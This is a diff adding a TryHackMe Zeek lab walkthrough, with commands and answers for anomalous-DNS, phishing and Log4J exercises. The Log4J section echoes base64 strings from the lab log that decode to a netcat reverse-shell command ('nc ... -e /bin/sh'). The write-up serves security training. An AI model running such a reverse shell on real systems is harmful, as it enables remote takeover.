@@ -2664,3 +2664,135 @@ We recommend completing the [**Zeek**](https://tryhackme.com/room/zeekbro) room 
 
 ### _**Anomalous DNS**_
 
+An alert triggered: "Anomalous DNS Activity".
+
+The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive. 
+
+**Answer the questions below**
+
+Investigate the dns-tunneling.pcap file. Investigate the dns.log file. What is the number of DNS records linked to the IPv6 address?
+
+- `cd Desktop/Exercise-Files/`
+- `ll` or `ls -lah`
+- `cd anomalous-dns/`
+- `ll`
+- `zeek -Cr dns-tunneling.pcap`
+- `ll`
+- `cat dns.log |grep AAAA |wc -l`
+- 320
+- Not sure what this has to do with ipv6 addresses because there is only 1 in the file. The hint says AAAA records contain ipv6. 
+
+Investigate the conn.log file. What is the longest connection duration?
+
+- `head conn.log`
+- `cat conn.log |zeek-cut duration |sort -u |tail`
+- 9.420791
+
+Investigate the dns.log file. Filter all unique DNS queries. What is the number of unique domain queries?
+
+- Hint: You need to use the DNS query values for summarising and counting the number of unique domains. There are lots of "***.cisco-update.com" DNS queries, you need to filter the main address and find out the rest of the queries that don't contain the "***.cisco-update.com" pattern. You can filter the main "***.cisco-update.com" DNS pattern as "cisco-update.com" with the following command; "cat dns.log | zeek-cut query |rev | cut -d '.' -f 1-2 | rev | head"
+- `cat dns.log | zeek-cut query |rev | cut -d '.' -f 1-2 | rev | head`
+- `cat dns.log | zeek-cut query |rev | cut -d '.' -f 1-2 | rev | sort -u`
+- `cat dns.log | zeek-cut query |rev | cut -d '.' -f 1-2 | rev | sort -u |wc -l`
+- 6
+
+There are a massive amount of DNS queries sent to the same domain. This is abnormal. Let's find out which hosts are involved in this activity. Investigate the conn.log file. What is the IP address of the source host?
+
+- `head dns.log`
+- 10.20.57.3
+- I looked at the id.orig_h for the first record with query to cisco. Not sure why they put conn.log in the question. 
+
+### _**Phishing**_
+
+An alert triggered: "Phishing Attempt".
+
+The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive. 
+
+**Answer the questions below**
+
+Investigate the logs. What is the suspicious source address? Enter your answer in defanged format.
+
+- `cd Desktop/Exercise-Files/`
+- `ll` or `ls -lah`
+- `cd phishing/`
+- `ll`
+- `zeek -Cr phishing.pcap`
+- `less conn.log`
+- go to google and search cyberchef, search defang, double click on defang IP, paste IP in the input section
+- 10[.]6[.]27[.]102
+
+Investigate the http.log file. Which domain address were the malicious files downloaded from? Enter your answer in defanged format.
+
+- `cat http.log`
+- go to google and search cyberchef, search defang, double click on defang URL, paste URL in the input section
+- smart-fax[.]com
+
+Investigate the malicious document in VirusTotal. What kind of file is associated with the malicious document?
+
+- `./clear-logs.sh`
+- `zeek -Cr phishing.pcap file-extract-demo.zeek hash-demo.zeek`
+- `head files.log`
+- `cat files.log |zeek-cut mime_type md5`
+- go to virustotal and use the md5 for msword 
+- b5243ec1df7d1d5304189e7db2744128
+- click on the RELATIONS tab look under Bundled Files for the File type
+- VBA
+
+Investigate the extracted malicious .exe file. What is the given file name in Virustotal?
+
+- `cat files.log |zeek-cut mime_type md5`
+- go to virustotal and use the md5 for dosexec
+- cc28e40b46237ab6d5282199ef78c464
+- go to the DETAILS tab and look for Original Name
+- PleaseWaitWindow.exe
+
+Investigate the malicious .exe file in VirusTotal. What is the contacted domain name? Enter your answer in defanged format.
+
+- go to the BEHAVIOR tab and look under DNS Resolutions for the .org
+- go to cyberchef to defang
+- hopto[.]org
+
+Investigate the http.log file. What is the request name of the downloaded malicious .exe file?
+
+- `cat http.log`
+- knr.exe
+
+### _**Log4J**_
+
+An alert triggered: "Log4J Exploitation Attempt".
+
+The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive. 
+
+- `cd Desktop/Exercise-Files/`
+- `ll` or `ls -lah`
+- `cd log4j/`
+- `ll`
+
+Investigate the log4shell.pcapng file with detection-log4j.zeek script. Investigate the signature.log file. What is the number of signature hits?
+
+- `zeek -Cr log4shell.pcapng detection-log4j.zeek`
+- `head signatures.log`
+- `cat signatures.log |zeek-cut sig_id`
+- 3
+
+Investigate the http.log file. Which tool is used for scanning?
+
+- `head http.log`
+- `cat http.log |zeek-cut user_agent |sort -u`
+- Nmap
+
+Investigate the http.log file. What is the extension of the exploit file?
+
+- `cat http.log |zeek-cut uri |sort -u`
+- .class
+
+Investigate the log4j.log file. Decode the base64 commands. What is the name of the created file?
+
+- `cat log4j.log |grep Base64`
+- `touch base64.txt`
+- `echo dG91Y2ggL3RtcC9wd25lZAo= >> base64.txt`
+- `echo d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg== >> base64.txt`
+- `echo bmMgMTkyLjE2OC41Ni4xMDIgODAgLWUgL2Jpbi9zaCAtdnZ2Cg== >> base64.txt`
+- `base64 -d base64.txt`
+- pwned
+
